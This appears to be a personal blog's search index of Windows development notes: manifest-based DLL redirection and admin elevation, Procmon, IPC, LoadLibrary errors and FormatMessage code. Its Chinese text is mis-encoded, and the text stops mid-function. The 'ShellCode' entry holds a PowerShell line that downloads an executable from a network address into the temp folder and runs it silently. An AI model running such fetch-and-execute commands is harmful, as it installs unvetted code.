å½“å‰ç³»ç»ŸQtPath:[%QtPath%] ï¼ˆæ¨è 5.9.9_msvc2015ï¼‰echo 2. å·¥å…·é›†é»˜è®¤é…ç½®ä¸º: $(DefaultPlatformToolset) ï¼ˆæ¨è 10.0.19041.0åŠä»¥ä¸Šï¼‰echo 3. SDKé»˜è®¤é…ç½®ä¸º: $([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) ï¼ˆæ¨è V142ï¼‰echo -----------------------------------------------------@REM if &quot;%QtPath%&quot; == &quot;&quot; (@REM choice /c:yn /m &quot;å½“å‰æœªé…ç½®ç¯å¢ƒå˜é‡ï¼Œæ˜¯å¦æ‰“å¼€ç³»ç»Ÿé…ç½®é¡µé¢ï¼š&quot;@REM if %errorlevel%==1 (@REM start ms-settings:about@REM )@REM )","tags":[{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ShellCode","date":"2023-10-27T01:24:01.954Z","path":"A_OS/Windows/ShellCode/ShellCode/","text":"å¥½æ–‡ Windows Shellcodeå­¦ä¹ ç¬”è®°â€”â€”é€šè¿‡VisualStudioç”Ÿæˆshellcode 1powershell.exe Invoke-WebRequest -Uri &#x27;https://10.218.80.215/client/360EPP145433958[10.218.80.215-8080]-W.exe&#x27; -OutFile &#x27;%temp%/360.tmp&#x27;; Rename-Item &#x27;%temp%/360.tmp&#x27; &#x27;%temp%/360EPP145433958[10.218.80.215-8080]-W.exe&#x27;; Start-Process &#x27;%temp%/360EPP145433958[10.218.80.215-8080]-W.exe&#x27; /S;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"code/shellcode","slug":"code-shellcode","permalink":"https://hodlyounger.github.io/tags/code-shellcode/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ShellCode","slug":"A-OS/Windows/ShellCode","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/ShellCode/"}]},{"title":"RT_MAINFEST æ–‡ä»¶","date":"2023-10-27T01:24:01.953Z","path":"A_OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“/ã€WINã€‘RT_MAINFEST/","text":"æ¦‚è¿°: MAINFESTæ–‡ä»¶è¯´æ˜åŠç›¸å…³ä½¿ç”¨ 0x01 å¯ä»¥æŒ‡å®šåŠ è½½çš„dll å¯ä»¥é€šè¿‡ä¿®æ”¹ MAINFEST æ–‡ä»¶å†…å®¹æ¥ä¿®æ”¹ dll çš„åŠ è½½ä½ç½®ã€‚ ç¤ºä¾‹ï¼š å¦‚ä¸‹æ‰€ç¤ºåˆ†åˆ«æŒ‡å®šäº† vcruntime140d.dll ã€ ucrtbased.dll ã€ libcrypto-3.dll ã€libssl-3.dll å››ä¸ªdllçš„åŠ è½½è·¯å¾„ 1234567&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27; standalone=&#x27;yes&#x27;?&gt;&lt;assembly xmlns=&#x27;urn:schemas-microsoft-com:asm.v1&#x27; manifestVersion=&#x27;1.0&#x27;&gt;&lt;file name=&quot;vcruntime140d.dll&quot; loadFrom=&quot;C:\\Users\\holdy\\Documents\\TestMySQL\\temp1\\vcruntime140d.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;ucrtbased.dll&quot; loadFrom=&quot;C:\\Users\\holdy\\Documents\\TestMySQL\\temp1\\ucrtbased.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;libcrypto-3.dll&quot; loadFrom=&quot;D:\\Documents\\A_Source\\WindowsTec\\Debug\\mysqlcppconn8-static-debug-openssl3-mtd\\libcrypto-3.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;libssl-3.dll&quot; loadFrom=&quot;D:\\Documents\\A_Source\\WindowsTec\\Debug\\mysqlcppconn8-static-debug-openssl3-mtd\\libcrypto-3.dll&quot;&gt;&lt;/file&gt;&lt;/assembly&gt; 0x02 è‡ªåŠ¨æå‡Vistaã€Win7ä¸Šè¿›ç¨‹çš„æƒé™â€“RT_MANIFEST å¾ˆå¤šæ—¶å€™è‡ªå·±å¼€å‘çš„åº”ç”¨ç¨‹åºéœ€è¦ä»¥æ›´é«˜çš„ç”¨æˆ·æƒé™æ¥è¿è¡Œï¼Œç‰¹åˆ«æ˜¯åœ¨Vistaã€Win7ä¸‹é¢ã€‚ å¦‚ä½•ä½¿å¾—è‡ªå·±ç¼–å†™çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶ä¹Ÿå¦‚åŒä¸‹é¢çš„æ–¹å¼ä¸€æ ·ï¼Œæç¤ºæƒé™æå‡ã€‚ æ–¹æ³•ï¼š æŒ‰ç…§é€šå¸¸æ–¹å¼ï¼Œå¼€å‘VCç¨‹åºï¼Œç¼–è¯‘ã€ç”Ÿæˆ.exeæ–‡ä»¶ï¼› åœ¨Debugæˆ–Releaseæ–‡ä»¶å¤¹ä¸‹é¢ï¼Œæ–°å»ºä¸€ä¸ªâ€œç¨‹åºå+.exe+.manifestâ€çš„æ–‡ä»¶ã€‚è‹¥ä½ ç”Ÿæˆçš„åº”ç”¨ç¨‹åºåç§°å«MyApp.exeï¼Œåœ¨MyApp.exeæ‰€åœ¨çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåç§°ä¸ºMyApp.exe.manifestçš„æ–‡ä»¶ï¼Œå°†è¯¥æ–‡ä»¶ä»¥æ–‡æœ¬æ–¹å¼æ‰“å¼€ï¼ˆå¦‚notepadï¼‰ å°†ä¸‹é¢çš„æ­¤æ®µXMLï¼Œç²˜è´´åˆ°åˆšåˆšæ–°å»ºçš„MyApp.exe.manifestæ–‡ä»¶ä¸­ï¼Œå¹¶ä¿å­˜ã€‚ 12345678910&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27; standalone=&#x27;yes&#x27;?&gt;&lt;assembly xmlns=&#x27;urn:schemas-microsoft-com:asm.v1&#x27; manifestVersion=&#x27;1.0&#x27;&gt; &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&#x27;requireAdministrator&#x27; uiAccess=&#x27;false&#x27; /&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt;&lt;/assembly&gt; requestedExecutionLevelå…ƒç´ ä¸­çš„â€œlevelâ€å±æ€§å¯ä»¥å–ä¸‹é¢çš„å€¼ï¼ˆæ¯”è¾ƒç®€å•çš„è‹±æ–‡ï¼Œç›¸ä¿¡å¤§å®¶éƒ½èƒ½çœ‹æ‡‚ï¼‰ã€‚ è¿è¡Œ.Net Visual Studioå‘½ä»¤æç¤ºç¬¦ï¼ˆæ³¨æ„æ˜¯.Netä¸‹ç±»ä¼¼cmd.exeçš„å·¥å…·ï¼Œä¸æ˜¯Windowsé™„ä»¶é‡Œé¢çš„cmd.exeï¼‰ã€‚å¦‚æœä½ å®‰è£…äº†Visual Studio .Net 2003 æˆ– 2005 ã€2008ã€2010ç­‰å¼€å‘å·¥å…·ï¼Œåœ¨å¼€å§‹èœå•-&gt;Visual Studio 2003æˆ–2005-&gt;Visual Studioå·¥å…·ä¸‹é¢å¯ä»¥æ‰¾åˆ°è¯¥å·¥å…·ã€‚ è¿è¡Œ.Net Visual Studioå‘½ä»¤æç¤ºç¬¦ä¹‹åï¼Œå°†å½“å‰ç›®å½•æ›´æ”¹åˆ°ä½ åº”ç”¨ç¨‹åºï¼ˆMyApp.exeï¼‰æ‰€åœ¨çš„ç›®å½•ä¸‹é¢ï¼Œä¹‹åè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š mt.exe -manifest â€œMyApp.exe.manifestâ€ -outputresource:â€œMyApp.exeâ€;#1 ï¼ˆæ­¤å¤„çš„MyAppè¦æ›¿æ¢æˆä½ è‡ªå·±åº”ç”¨ç¨‹åºçš„åå­—ï¼‰ ä¹‹åå†åˆ°ä½ åº”ç”¨ç¨‹åºçš„ç›®å½•ä¸‹é¢å°±ä¼šçœ‹åˆ°ï¼Œç°åœ¨åº”ç”¨ç¨‹åºçš„å›¾æ ‡æ¯”åŸæ¥å¤šäº†ä¸€ä¸ªå®‰å…¨ç›¾ã€‚ è¿è¡Œç¨‹åºå°±ä¼šå‡ºç°æç¤ºã€‚ æ³¨ï¼šå¦‚æœæ‚¨å¼€å‘çš„æ˜¯åŠ¨æ€é“¾æ¥åº“DLLã€‚åˆ™åœ¨.Net Visual Studioå‘½ä»¤æç¤ºç¬¦ä¸­è¾“å…¥çš„å‘½ä»¤åº”è¯¥ä¸ºï¼š 1mt.exe -manifest &quot;MyApp.dll.manifest&quot; -outputresource:&quot;MyApp.dll&quot;;#2 ã€‚ æœ€åï¼Œè¯»è€…ä¸å¦¨è‡ªå·±æµ‹è¯•ä¸€ä¸‹æœ¬æ–‡æ‰€è®²çš„æ–¹æ³•ï¼Œåœ¨Vistaæˆ–Win7ç³»ç»Ÿä¸‹ï¼Œç¼–å†™ä¸€ä¸ªä¿®æ”¹ç³»ç»Ÿæ—¶é—´çš„ç®€å•åº”ç”¨ï¼Œåœ¨ä¸é‡‡ç”¨æ­¤æ–¹æ³•ä¹‹å‰ï¼Œçœ‹èƒ½å¦ä¿®æ”¹æˆåŠŸã€‚å¦‚æœä¸èƒ½è¯•è¯•æœ¬æ–‡è®²è¿°çš„æ–¹æ³•ï¼Œç„¶åè¿è¡Œç¨‹åºå†çœ‹çœ‹èƒ½å¦ä¿®æ”¹æˆåŠŸã€‚ ä¿®æ”¹ç³»ç»Ÿæ—¶é—´çš„ä»£ç å¦‚ä¸‹ï¼š COleDateTime tm; SYSTEMTIME st; tm.ParseDateTime(_T(â€œ2000-10-10 17:00:00â€)); tm.GetAsSystemTime(st); SetLocalTime(&amp;st); åœ¨Vistaä¸‹æå‡åº”ç”¨ç¨‹åºçš„æ‰§è¡Œæƒé™ åœ¨ vistaç³»ç»Ÿåº”ç”¨ç¨‹åºæ‰§è¡Œæ—¶é»˜è®¤ä¸ä¼šä½¿ç”¨è¶…çº§ç”¨æˆ·æƒé™,è¿™ä¼šä½¿ä¸€äº›åˆ›å»ºæ–‡ä»¶å’Œç›®å½•çš„IOæ“ä½œå¤±è´¥,å‡ºç°è®¿é—®é”™è¯¯.è¿™ç§ç°è±¡æ˜¯å› ä¸ºVistaçš„UACç‰¹æ€§ å¼•èµ·çš„. è¦é¿å…è¿™ç§æƒ…å†µ,å¯ä»¥å¼ºåˆ¶ç”¨æˆ·åœ¨è¿è¡Œåº”ç”¨ç¨‹åºæ—¶ä»¥è¶…çº§ç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº.å…·ä½“åšæ³•: ç¼–è¾‘manifestæ–‡ ä»¶. åœ¨manifestæ–‡ä»¶ä¸­é…ç½®å¥½åº”ç”¨ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦çš„å‚æ•°å’Œæ‰§è¡Œç¯å¢ƒ.ä¸‹é¢æ˜¯ä¸€ä¸ªå®é™…ä¾‹å­: 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt; &lt;assemblyIdentity version=&quot;1.0.0.0&quot; processorArchitecture=&quot;X86&quot; name=&quot;IsUserAdmin&quot; type=&quot;win32&quot;/&gt; &lt;description&gt;Description of your application&lt;/description&gt; &lt;!-- Identify the application security requirements. --&gt; &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&quot;requireAdministrator&quot; uiAccess=&quot;false&quot;/&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt; &lt;/assembly&gt; ç¼–è¾‘åº”ç”¨ç¨‹åºçš„èµ„æºæ–‡ä»¶(rcåç¼€çš„æ–‡ä»¶),åœ¨å…¶ä¸­åŠ å…¥ä¸‹é¢ä¸¤è¡Œä»£ç : 1#define MANIFEST_RESOURCE_ID 1MANIFEST_RESOURCE_ID RT_MANIFEST &quot;&#123;Application.exe&#125;.manifest&quot; å…¶ä¸­ Application.exe æ›¿æ¢æˆè¦ç¼–è¯‘ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å. ç¼–è¯‘é“¾æ¥ç¨‹åº,ç”Ÿæˆå¯æ‰§è¡Œåº”ç”¨ç¨‹åº. è¿è¡Œ mt.exeå‘½ä»¤,æŠŠmanifestæ–‡ä»¶å’Œç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºé“¾æ¥èµ·æ¥.æŠŠmanifestå†…å®¹å†™å…¥å¯æ‰§è¡Œæ–‡ä»¶. å‘½ä»¤è¡Œä¸º: 1mt.exe â€“manifest temp.manifest â€“outputresource:YourApp.exe;#1 åˆ°è¿™ä¸€æ­¥,ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å°±å¯ä»¥åœ¨vistaä¸‹è¿è¡Œæ—¶å¼¹å‡ºUACç¡®è®¤æ¡†,è®©ç”¨æˆ·ç¡®è®¤ä»¥è¶…çº§ç”¨æˆ·æƒé™æ‰§è¡Œåº”ç”¨ç¨‹åº.","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"PE","slug":"PE","permalink":"https://hodlyounger.github.io/tags/PE/"},{"name":"Windows/dll","slug":"Windows-dll","permalink":"https://hodlyounger.github.io/tags/Windows-dll/"},{"name":"Windows/exe","slug":"Windows-exe","permalink":"https://hodlyounger.github.io/tags/Windows-exe/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"A-OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"}]},{"title":"Procmon è¿‡æ»¤ç”¨æ³•","date":"2023-10-27T01:24:01.952Z","path":"A_OS/Windows/å·¥å…·/ã€winã€‘Procmonä½¿ç”¨æŠ€å·§/","text":"Application Details â€“ Process Nameï¼šäº§ç”Ÿäº‹ä»¶çš„é‚£ä¸ªè¿›ç¨‹çš„åå­— â€“ Image Pathï¼šè¿›ç¨‹é•œåƒçš„å®Œæ•´è·¯å¾„ â€“ Command Lineï¼šå‘½ä»¤è¡Œï¼Œç”¨äºå¯åŠ¨è¿›ç¨‹ â€“ Company Nameï¼šè¿›ç¨‹é•œåƒæ–‡ä»¶ä¸­çš„ä¼ä¸šåç§°ã€‚è¿™ä¸ªæ–‡æœ¬æ˜¯ç”±åº”ç”¨ç¨‹åºçš„å¼€å‘è€…æ¥å®šä¹‰çš„ â€“ Descriptionï¼šè¿›ç¨‹é•œåƒæ–‡ä»¶ä¸­çš„äº§å“æè¿°ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡æœ¬æ˜¯ç”±åº”ç”¨ç¨‹åºçš„å¼€å‘è€…å®šä¹‰çš„ â€“ Versionï¼šè¿›ç¨‹é•œåƒæ–‡ä»¶ä¸­çš„äº§å“ç‰ˆæœ¬å·ã€‚è¿™ä¸ªæ–‡æœ¬æ˜¯ç”±åº”ç”¨ç¨‹åºçš„å¼€å‘è€…å®šä¹‰çš„ Event Details â€“ Sequence Numberï¼šæ“ä½œåœ¨å…¨ä½“äº‹ä»¶ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œä¹ŸåŒ…æ‹¬å½“å‰çš„è¿‡æ»¤ â€“ Event Classï¼šäº‹ä»¶çš„ç±»åˆ«ï¼ˆæ–‡ä»¶ï¼Œæ³¨å†Œè¡¨ï¼Œè¿›ç¨‹ï¼‰ â€“ Operationï¼šç‰¹æ®Šäº‹ä»¶æ“ä½œï¼Œæ¯”å¦‚Readã€RegQueryValueç­‰ â€“ Date &amp; Timeï¼šæ“ä½œçš„æ—¥æœŸå’Œæ—¶é—´ â€“ Time of Dayï¼šåªæ˜¯æ“ä½œçš„æ—¶é—´ â€“ Pathï¼šä¸€ä¸ªäº‹ä»¶å¼•ç”¨èµ„æºçš„è·¯å¾„ â€“ Detailï¼šäº‹ä»¶çš„é™„åŠ ä¿¡æ¯ â€“ Resultï¼šä¸€ä¸ªå®Œæˆäº†çš„æ“ä½œçš„çŠ¶æ€ç  â€“ Relative Timeï¼šä¸€ä¸ªæ“ä½œç›¸å¯¹äºProcess Monitorçš„å¯åŠ¨åçš„æ—¶é—´ï¼Œæˆ–è€…ç›¸å¯¹äºProcess Monitorçš„ä¿¡æ¯æ¸…é™¤åçš„æ—¶é—´ â€“ Durationï¼šä¸€ä¸ªå·²ç»å®Œæˆäº†çš„æ“ä½œæ‰€æŒç»­çš„æ—¶é—´ Process Management â€“ User Nameï¼šæ­£åœ¨æ‰§è¡Œæ“ä½œçš„è¿›ç¨‹çš„ç”¨æˆ·è´¦æˆ·å â€“ Session IDï¼šæ­£åœ¨æ‰§è¡Œæ“ä½œçš„è¿›ç¨‹çš„Windowsä¼šè¯ID â€“ Authentication IDï¼šæ­£åœ¨æ‰§è¡Œæ“ä½œçš„è¿›ç¨‹çš„ç™»å½•ä¼šè¯ID â€“ Process IDï¼šæ‰§è¡Œäº†æ“ä½œçš„è¿›ç¨‹çš„è¿›ç¨‹ID â€“ Thread IDï¼šæ‰§è¡Œäº†æ“ä½œçš„çº¿ç¨‹çš„çº¿ç¨‹ID â€“ Integrity Levelï¼šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ‰§è¡Œæ“ä½œæ—¶çš„å¯ä¿¡çº§åˆ«ï¼ˆä»…æ”¯æŒVistaä»¥ä¸Šç³»ç»Ÿï¼‰ â€“ Virtualizedï¼šæ‰§è¡Œäº†æ“ä½œçš„è¿›ç¨‹çš„è™šæ‹ŸåŒ–çŠ¶æ€ åˆ é™¤æ–‡ä»¶ åˆ é™¤ _del. é‡å‘½åå¹¶åˆ é™¤ trustdservice.exe -&gt; trustservice_del.exe ï¼ˆä»¥ä¸‹æ–‡ä»¶å‡æ”¹ä¸º&quot;æ–‡ä»¶å_del.ext&quot;ï¼‰ trustfixservice.exe ServiceDetect.dll libgcommon.dll TrustAgent.exe TrustAgentApp.dll trustcore.dll trustnc.dll trustproxy.dll trustproxyserver.dll trustcheck.exe trustproxy64.sys trustproxy.sys vpnvnic.sys QInstUtils.exe ClientLogTool.exe QtWebEngineProcess.exe TrustAgent.config TrustAgentExtra.config é‡å‘½åå®Œæˆä¹‹åä¼šåˆ é™¤ä»¥ä¸Šæ–‡ä»¶ ç»“æŸè¿›ç¨‹ trustservice TrustAgent QtWebEngineProcess trustdservice trustfixservice é‡Šæ”¾æ–‡ä»¶ æ–‡ä»¶ è™šæ‹Ÿç½‘å¡é©±åŠ¨ ä»£ç†é©±åŠ¨ trustservice trustfixservice.exe ServiceDetect.dll libgcommon.dll TrustAgent.exe TrustAgentApp.dll trustcore.dll trustnc.dll trustproxy.dll trustproxyserver.dll trustcheck.exe trustproxy64.sys trustproxy.sys vpnvnic.sys QInstUtils.exe ClientLogTool.exe QtWebEngineProcess.exe ç›®å½• qtdepends oemdepends cert åˆ é™¤æ—§çš„å¿«æ·æ–¹å¼ å›½ä¿¡å®‰å…¨æ¥å…¥.lnk é’é¸¾å®‰å…¨æ¥å…¥.lnk TrustAgent.lnk é›¶ä¿¡ä»»å®¢æˆ·ç«¯.lnk æ¸…ç†è·¯ç”± è°ƒç”¨å®‰è£…ç›®å½•ä¸‹ ClearHost.exe æ›´æ–°é…ç½®æ–‡ä»¶ TrustAgent.config TrustAgentExtra.config æ›´æ–°æ³¨å†Œè¡¨ æ³¨å†Œè¡¨è·¯å¾„ 1!define PRODUCT_UNINST_KEY &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$&#123;PRODUCT_NAME&#125;&quot; æ›´æ–°å­—æ®µ DisplayName Publisher DisplayIcon UninstallString DisplayVersion InstallDir ProxyVersion InstParams é…ç½®å´©æºƒçŠ¶æ€ é…ç½®ç³»ç»ŸLocalDumpsï¼Œè®¾ç½®ç›¸å…³æ³¨å†Œè¡¨é¡¹ å¯åŠ¨ YMDbg.exe ç›´æ¥å¯åŠ¨ $INSTALLDIR\\Dbg\\Ymdbg.exe 1Exec YMDbg.exe -i1","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Porcmon","slug":"Porcmon","permalink":"https://hodlyounger.github.io/tags/Porcmon/"},{"name":"sysinternalssuite","slug":"sysinternalssuite","permalink":"https://hodlyounger.github.io/tags/sysinternalssuite/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"windowsè¿›ç¨‹é—´é€šä¿¡æ•´ç†","date":"2023-10-27T01:24:01.951Z","path":"A_OS/Windows/IPC/windowsè¿›ç¨‹é—´é€šä¿¡/","text":"æ¦‚è¿°ï¼šwindowsè¿›ç¨‹é—´é€šä¿¡çš„å„ç§æ–¹å¼ graph LR A(windowsè¿›ç¨‹é—´é€šä¿¡) --> B[\"ç®¡é“(pipe)\"] A --> C[\"é‚®ä»¶æ§½(Mailslots)\"] A --> D[\"æ–‡ä»¶æ˜ å°„(fileMapping)\"] A --> E[\"ä¿¡å·é‡(Semaphore)\"] A --> F[\"ä¿¡å·(signal)\"] A --> G[\"å¥—æ¥å­—(Socket)\"] A --> H[\"åŠ¨æ€åº“(dll)\"] A --> I[\"ç»„ä»¶å¯¹è±¡æ¨¡å‹(COM)\"] B --> B1[\"åŒ¿åç®¡é“(Anonymous pipe)\"] B --> B2[\"å‘½åç®¡é“(named pipe)\"] D --> D1[\"å…±äº«å†…å­˜(shared memory)\"] F --> F1[\"windowsæ²¡æœ‰ä¿¡å·è¿™ä¸ªæ¦‚å¿µï¼Œä½†æ˜¯ä¼šæä¾›ç±»ä¼¼åŠŸèƒ½çš„apiï¼Œæ¯”å¦‚æ€æ­»è¿›ç¨‹ã€‚linuxä¸‹çš„killä¿¡å·ï¼Œwindowsä¸‹æä¾›TerminateProcess\"] H --> H1[\"åœ°å€æ— å…³ä»£ç ï¼šä¸¤ä¸ªè¿›ç¨‹æ— æ³•é€šè¿‡åŒä¸€ä¸ªdllè¿›è¡Œæ•°æ®äº¤æ¢\"]","tags":[{"name":"IPC","slug":"IPC","permalink":"https://hodlyounger.github.io/tags/IPC/"},{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"IPC","slug":"A-OS/Windows/IPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/IPC/"}]},{"title":"ã€GetLastErrorã€‘126","date":"2023-10-27T01:24:01.950Z","path":"A_OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†/GetLastError/ã€GetLastErrorã€‘126/","text":"æ¦‚è¿°ï¼šLoadLibraryåŠ è½½å¤±è´¥ï¼Œè¿”å›126ï¼Œè§£å†³æ–¹æ³•ã€‚ [toc] é—®é¢˜æè¿°ï¼š æœåŠ¡åŠ è½½çš„ DLL ä¾èµ–ç¬¬ä¸‰æ–¹ DLLã€‚ åœ¨æŸä¸€ä¸ªwindowsç¯å¢ƒä¸­ï¼Œå®‰è£…äº†ä¸€ä¸ªæœåŠ¡ dï¼ŒæœåŠ¡ d çš„å¯åŠ¨ä¾èµ–äºä¸€ä¸ªå…³é”®çš„ dll æ–‡ä»¶(å‡è®¾ä¸ºinfo.dll)ï¼Œinfo.dll æ‰€ä¾èµ–çš„ dll ä¹Ÿå­˜åœ¨ï¼Œä½†æ˜¯åœ¨æœåŠ¡å¯åŠ¨çš„æ—¶å€™ï¼Œä½¿ç”¨ LoadLibrary å‡½æ•°ä¼šè¿”å›GetLastError 126ã€‚ æ’æŸ¥æ‰‹æ®µè®°å½• ä½¿ç”¨ Dependencies GUI æŸ¥çœ‹ DLL çš„ä¾èµ–ä¹Ÿæ˜¯éƒ½æ»¡è¶³çš„ã€‚é—®é¢˜è¿˜æ˜¯å‡ºåœ¨æœåŠ¡è¿›ç¨‹åŠ è½½çš„ DLL å¦‚ä½•åŠ è½½å¦å¤–ä¸€ä¸ª DLLã€‚ å·²ç»å°è¯•è¿‡çš„æ’æŸ¥æ‰‹æ®µåŒ…æ‹¬ä½†ä¸é™äºï¼š windbg æŒ‚è½½ï¼Œä¿®æ”¹ showsnaps æŸ¥çœ‹ dll åŠ è½½è®°å½•ã€‚ å¯èƒ½å’Œ DLL æœ‰å…³ç³»ï¼Œä½œä¸º DLL ä¸èƒ½ç›´æ¥åŠ è½½ DLLã€‚ ä½¿ç”¨ç»å¯¹è·¯å¾„åŠ è½½dll 1234// oldLoadLibrary(&quot;info.dll&quot;);// newLoadLibrary(&quot;C:\\\\info.dll&quot;); é—®é¢˜å…³é”®","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å¼‚å¸¸åŠé”™è¯¯å¤„ç†","slug":"A-OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"name":"GetLastError","slug":"A-OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†/GetLastError","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/GetLastError/"}]},{"title":"ã€winapiã€‘FormatMessageå‡½æ•°çš„ä½¿ç”¨","date":"2023-10-27T01:24:01.948Z","path":"A_OS/Windows/API/ã€winapiã€‘FormatErrMessage/","text":"æ¦‚è¿°ï¼šFormatMessage å‡½æ•°çš„ä½¿ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344const char* SPErrMsg(int errcode)&#123; static char _g_inner_msg[1024]; memset(_g_inner_msg, 0, sizeof(_g_inner_msg));#if SP_PLATFORM==SP_PLATFORM_WINDOWS if (0==errcode) &#123; errcode = GetLastError(); &#125; LPTSTR buf = NULL; if (::FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errcode, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US) /* MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) */, (LPTSTR)&amp;buf, 0, NULL)) &#123; // DWORD language_id // MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) // MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US) // MAKELANGID(LANG_CHINESE_SIMPLIFIED, SUBLANG_CHINESE_SIMPLIFIED) // MAKELANGID(LANG_CHINESE_TRADITIONAL, SUBLANG_CHINESE_TRADITIONAL) int len = snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]%s&quot;, errcode, buf); if ( len&gt;2 &amp;&amp; _g_inner_msg[len-1]==&#x27;\\n&#x27; &amp;&amp; _g_inner_msg[len-2]==&#x27;\\r&#x27; ) &#123; _g_inner_msg[len - 1] = &#x27;\\0&#x27;; _g_inner_msg[len - 2] = &#x27;\\0&#x27;; &#125; ::LocalFree(buf); &#125; else &#123; snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]Unknown error %d&quot;, errcode, errcode); &#125;#else // https://stackoverflow.com/questions/3219393/stdlib-and-colored-output-in-c if (0==errcode) &#123; errcode = errno; errno = errcode; &#125; snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]%s&quot;, (int)errcode, strerror(errcode));#endif return 